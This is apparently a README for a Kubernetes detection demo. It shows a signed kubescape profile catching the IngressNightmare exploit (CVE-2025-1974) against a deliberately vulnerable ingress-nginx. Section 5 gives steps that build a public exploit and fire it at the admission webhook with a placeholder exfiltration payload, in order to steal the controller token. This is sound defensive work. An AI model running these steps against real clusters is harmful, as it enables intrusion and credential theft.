# IngressNightmare vs a signed SBoB — runtime tampering demo

An AI-agent / attacker workload that oversteps its intent and breaks out via a real recent CVE, watched by a **signed** ContainerProfile (SBoB). The ingress-nginx controller runs under a vendor-signed profile; node-agent verifies the signature on ingest, adopts it as the authoritative base, and flags the exploit's runtime deviation. The signature pins the contract — the workload can't widen its own authorization.

- **CVE:** IngressNightmare, **CVE-2025-1974** (admission-controller RCE) via the **`auth-url`** injection **CVE-2025-24514**.
- **Runs on a single-node k3s PG** — no GPU, no node-runtime downgrade. Everything is `kubectl apply` + an in-cluster exploit pod.
- Validated: k3s v1.36.1, kernel 6.12.80, x86_64, ingress-nginx **v1.11.0** (patched in 1.11.5/1.12.1).

## 0. Prerequisites

```
git clone -b signed-bundle-demo https://github.com/k8sstormcenter/bob && cd bob
```

Single-node k3s + `kubectl`, `helm`, `python3` (`python3-yaml`, `python3-requests`), `go`, `gcc`, `libssl-dev`. `setup.sh` installs the missing OS packages.

## 1. One-shot

```
example/ingress-nightmare/setup.sh
```

Installs the signed stack, deploys vulnerable ingress-nginx, signs + binds the controller SBoB, fires the exploit, prints the detections, then tampers the SBoB. Steps below are the same thing by hand.

## 2. Signed stack + monitor the controller

```
make kubescape
kubectl -n honey rollout status ds/node-agent --timeout=300s
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false | grep -o "signed bundle overlays enabled[^\"]*" | sort -u
```

Expect `signed bundle overlays enabled in alert mode`. The chart's `excludeNamespaces` lists `ingress-nginx`; drop it so node-agent watches the controller (setup.sh patches the node-agent ConfigMap and restarts the DaemonSet).

## 3. Vulnerable ingress-nginx

```
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.11.0/deploy/static/provider/cloud/deploy.yaml
kubectl -n ingress-nginx rollout status deploy/ingress-nginx-controller --timeout=180s
```

## 4. Sign the SBoB and bind it

The SBoB is **authored, not learned**: `cp-ingress-base.yaml` in this directory
is the profile that gets signed. 4 execs, 80 opens, with ingress and egress
declared rather than recorded.

```
python3 example/ingress-nightmare/hack/cp-to-fragment.py \
  < example/ingress-nightmare/cp-ingress-base.yaml \
  > example/ingress-nightmare/frag-base-ingress.yaml
example/redis/distros/signed-bundles/sign-fragment.sh example/ingress-nightmare/frag-base-ingress.yaml example/redis/distros/signed-bundles/keys/vendor.pem
kubectl -n ingress-nginx patch deploy ingress-nginx-controller --type merge -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":"ingress-base"}}}}}'
```

node-agent verifies + adopts the signed profile (observed):

```
Successfully verified object signature   namespace=ingress-nginx name=ingress-base identity=local-key issuer=local
adopted user-authored ContainerProfile as authoritative base   namespace=ingress-nginx name=ingress-base
```

### Why authored rather than learned

Learning the profile here signed whatever that one run happened to capture, so
the signed contract changed every time and depended on how much traffic the
controller had seen before the window closed. A signature over a moving target
pins nothing. `setup.sh LEARN=1` still records a fresh one if you want to
compare.

Two things in the authored profile cannot be learned at all:

- **The network shape.** The only ingress peer a recording observes is whatever
  client happened to send traffic — in the run this was captured from, that was
  the load generator, so the learned profile admitted `run: ing-load` and
  nothing else. An ingress controller is reached by ANY client, so 80/443 are
  declared open deliberately. 8443 is the admission webhook, 10254 the kubelet
  probe (`entity: host` — the node carries no pod identity, so no selector can
  match it), and the apiserver and kube-dns are named rather than addressed.

- **`rulePolicies.R0006`.** R0006 is gated on the READING COMM, not on the path:
  declaring the projected token as an open does not silence it. The controller
  reads its own token to talk to the apiserver, so `nginx-ingress-c` is allowed
  — and that is what makes the exploit's `cat` of the same file stand out.

`/proc` and `/run/secrets` are left literal on purpose. nginx's read-only lua
and vendor trees collapse to wildcards (344 raw opens down to 80), but the paths
the exploit touches stay visible, which is the whole detection.

Bound and measured: **0 false positives** across a benign traffic run.

## 5. Attack — IngressNightmare

```
git clone https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein && (cd ein && go build -o ing .)
PODIP=$(kubectl -n ingress-nginx get pod -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].status.podIP}')
ADM=$(kubectl -n ingress-nginx get svc ingress-nginx-controller-admission -o jsonpath='{.spec.clusterIP}')
./ein/ing -m c -c '<exfil payload>' -i https://$ADM:443 -u http://$PODIP:80 --is-auth-url
```

`Exploit Success! pid: N, fd: M` — code runs as `www-data` in the controller pod, the controller ServiceAccount token is exfiltrated (cluster-wide Secret read).

## 6. Expected detections

Against the signed profile, node-agent flags (observed):

```
R0002  Unexpected file access detected: nginx with PID <n> to /proc/<pid>/fd/<n>
R0002  Unexpected file access detected: nginx ... to /tmp/nginx/nginx-cfg<...>
R0012  Unexpected Ingress Network Traffic ... to: controller
```

`R0002` on `nginx -> /proc/<pid>/fd/<n>` is the IngressNightmare signature — the malicious shared library loaded from `/proc` during `nginx -t`. The injected `nginx-cfg` temp files and the out-of-baseline traffic corroborate.

Reproducing the exploit's runtime signature by hand against the authored SBoB
(reads of `/proc/<pid>/fd`, the projected token and `/etc/shadow`) raised **11
alerts across 5 rules**: R0006 on the token read, R0010 on `/etc/shadow`, R0002
on the `/proc` reads, plus R0040 and R0004. The R0006 there is the comm-scoped
policy doing its job — the controller reading its own token is silent, `cat`
reading the same file is not.

## 7. Signature integrity

The bound SBoB is signature-verified at ingest and re-derived from the signed content — an unsigned edit to the stored copy is display-only and does not widen enforcement. Fragment-composite tampering raises `R0002`/`R1016` per the signed-bundles contract; see `../redis/distros/signed-bundles/demo.md` §2b and §7 for the full OFF/ALERT/ENFORCE tamper matrix (`R1016` Signed profile tampered, `R1017` Signed profile drift).

## 8. Cleanup

```
kubectl delete ns ingress-nginx calico-system --ignore-not-found
helm -n honey uninstall kubescape
```
